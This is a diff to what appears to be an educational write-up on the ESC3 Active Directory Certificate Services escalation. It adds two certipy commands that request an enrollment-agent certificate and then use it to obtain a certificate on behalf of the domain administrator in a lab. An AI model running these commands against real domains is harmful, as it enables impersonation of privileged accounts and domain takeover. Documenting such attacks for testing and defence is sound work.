@@ -21,3 +21,12 @@ The attack requirements for ESC3 include:
 2. The certificate request is not required to be approved by a certificate “manager”.
 3. Authorized signatures aren’t required, meaning that a pre-approved certificate does not need to be provided to issue a new certificate.
 4. The template includes the “Certificate Request Agent EKU”, allowing the request of a certificate as a highly privileged user.
+
+```
+certipy req -u attacker -p 'P@ssw0rd' -target-ip 192.168.1.2 -ca 'lab-DC-CA' -template 'ESC3'
+```
+
+```
+certipy req -u attacker -p 'P@ssw0rd' -target-ip 192.168.1.2 -ca 'lab-DC-CA' -template 'User' -on-behalf-of 'lab\administrator' -pfx 'attacker.pfx'
+
+```
